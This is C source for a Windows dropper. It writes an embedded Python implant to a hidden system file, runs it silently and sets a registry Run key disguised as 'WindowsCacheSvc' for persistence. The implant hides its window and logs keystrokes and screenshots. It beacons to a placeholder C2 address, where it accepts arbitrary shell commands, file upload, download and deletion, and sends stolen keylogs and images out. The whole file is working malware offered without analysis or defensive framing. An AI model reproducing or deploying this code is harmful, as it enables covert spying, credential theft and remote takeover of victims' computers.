// language: C, file: dropper.c, target: Windows, MinGW
// gcc -mconsole dropper.c -o dropper.exe

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main(void) {
    const char *path = "C:\\Users\\HP\\AppData\\Local\\cache\\syscache.py";

    // --- the full implant (escaped) ---
    const char *payload =
        "import os, sys, time, socket, threading, subprocess, json, base64, ctypes, struct\n"
        "from pathlib import Path\n"
        "from datetime import datetime\n"
        "C2 = (\"YOUR.PUBLIC.IP\", 5555)\n"
        "INSTALL = Path(os.environ[\"LOCALAPPDATA\"]) / \"cache\"\n"
        "LOG = INSTALL / \"k.dat\"\n"
        "INSTALL.mkdir(parents=True, exist_ok=True)\n"
        "def hide():\n"
        "    try:\n"
        "        hwnd = ctypes.windll.kernel32.GetConsoleWindow()\n"
        "        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)\n"
        "    except: pass\n"
        "hide()\n"
        "try:\n"
        "    from pynput import keyboard\n"
        "    HAS_KL = True\n"
        "except:\n"
        "    HAS_KL = False\n"
        "class KL:\n"
        "    def __init__(self):\n"
        "        self.buf = []\n"
        "        self.lock = threading.Lock()\n"
        "    def on_press(self, key):\n"
        "        try: k = key.char\n"
        "        except: k = f\"[{getattr(key,'name',str(key))}]\"\n"
        "        with self.lock:\n"
        "            self.buf.append(f\"{datetime.now():%H:%M:%S} {k}\")\n"
        "    def flush(self):\n"
        "        with self.lock:\n"
        "            if not self.buf: return\n"
        "            data = \"\\n\".join(self.buf)+\"\\n\"\n"
        "            self.buf.clear()\n"
        "        try:\n"
        "            with open(LOG, \"ab\") as f: f.write(data.encode(\"utf-8\",\"ignore\"))\n"
        "        except: pass\n"
        "    def start(self):\n"
        "        if not HAS_KL: return\n"
        "        listener = keyboard.Listener(on_press=self.on_press)\n"
        "        listener.daemon = True\n"
        "        listener.start()\n"
        "        while True:\n"
        "            time.sleep(20)\n"
        "            self.flush()\n"
        "def screenshot():\n"
        "    try:\n"
        "        from PIL import ImageGrab\n"
        "        img = ImageGrab.grab()\n"
        "        p = INSTALL / f\"s_{int(time.time())}.png\"\n"
        "        img.save(p, \"PNG\")\n"
        "        return p\n"
        "    except: return None\n"
        "def send(sock, data):\n"
        "    sock.sendall(struct.pack(\">I\", len(data)) + data)\n"
        "def recv(sock):\n"
        "    hdr = sock.recv(4)\n"
        "    if not hdr: return None\n"
        "    n = struct.unpack(\">I\", hdr)[0]\n"
        "    buf = b\"\"\n"
        "    while len(buf) < n:\n"
        "        chunk = sock.recv(n - len(buf))\n"
        "        if not chunk: return None\n"
        "        buf += chunk\n"
        "    return buf\n"
        "def handle(cmd):\n"
        "    cmd = cmd.strip()\n"
        "    low = cmd.lower()\n"
        "    if low == \"ping\": return b\"alive\"\n"
        "    if low == \"sysinfo\": return f\"{os.environ.get('COMPUTERNAME')} | {os.environ.get('USERNAME')} | {sys.platform}\".encode()\n"
        "    if low == \"keylog\":\n"
        "        try: return LOG.read_bytes() if LOG.exists() else b\"\"\n"
        "        except: return b\"\"\n"
        "    if low == \"keylog_clear\":\n"
        "        try: LOG.write_bytes(b\"\")\n"
        "        except: pass\n"
        "        return b\"cleared\"\n"
        "    if low == \"screenshot\":\n"
        "        p = screenshot()\n"
        "        if not p: return b\"fail\"\n"
        "        data = p.read_bytes()\n"
        "        p.unlink(missing_ok=True)\n"
        "        return data\n"
        "    if low.startswith(\"shell \"):\n"
        "        c = cmd[6:]\n"
        "        try: return subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=45)\n"
        "        except Exception as e: return str(e).encode()\n"
        "    if low.startswith(\"cd \"):\n"
        "        try:\n"
        "            os.chdir(cmd[3:].strip())\n"
        "            return os.getcwd().encode()\n"
        "        except Exception as e: return str(e).encode()\n"
        "    if low == \"pwd\": return os.getcwd().encode()\n"
        "    if low.startswith(\"download \"):\n"
        "        path = cmd[9:].strip()\n"
        "        try: return Path(path).read_bytes()\n"
        "        except Exception as e: return str(e).encode()\n"
        "    if low.startswith(\"upload \"):\n"
        "        parts = cmd.split(\" \", 2)\n"
        "        if len(parts) < 3: return b\"usage\"\n"
        "        try:\n"
        "            Path(parts[1]).write_bytes(base64.b64decode(parts[2]))\n"
        "            return b\"ok\"\n"
        "        except Exception as e: return str(e).encode()\n"
        "    if low == \"ls\":\n"
        "        try: return \"\\n\".join(os.listdir(\".\")).encode()\n"
        "        except Exception as e: return str(e).encode()\n"
        "    if low.startswith(\"rm \"):\n"
        "        try:\n"
        "            Path(cmd[3:].strip()).unlink()\n"
        "            return b\"deleted\"\n"
        "        except Exception as e: return str(e).encode()\n"
        "    try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=45)\n"
        "    except Exception as e: return str(e).encode()\n"
        "def beacon():\n"
        "    while True:\n"
        "        try:\n"
        "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "            s.settimeout(15)\n"
        "            s.connect(C2)\n"
        "            send(s, b\"READY\")\n"
        "            while True:\n"
        "                data = recv(s)\n"
        "                if data is None: break\n"
        "                resp = handle(data.decode(\"utf-8\", \"ignore\"))\n"
        "                send(s, resp)\n"
        "            s.close()\n"
        "        except: pass\n"
        "        time.sleep(8)\n"
        "if __name__ == \"__main__\":\n"
        "    t = threading.Thread(target=KL().start, daemon=True)\n"
        "    t.start()\n"
        "    beacon()\n";

    // write the implant
    CreateDirectoryA("C:\\Users\\HP\\AppData\\Local\\cache", NULL);
    FILE *f = fopen(path, "wb");
    if (f) {
        fputs(payload, f);
        fclose(f);
    }

    // set hidden + system
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    // run once now (silent)
    system("pythonw \"C:\\Users\\HP\\AppData\\Local\\cache\\syscache.py\"");

    // persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        const char *cmd = "pythonw \"C:\\Users\\HP\\AppData\\Local\\cache\\syscache.py\"";
        RegSetValueExA(hKey, "WindowsCacheSvc", 0, REG_SZ,
                       (const BYTE*)cmd, (DWORD)(strlen(cmd)+1));
        RegCloseKey(hKey);
    }

    return 0;
}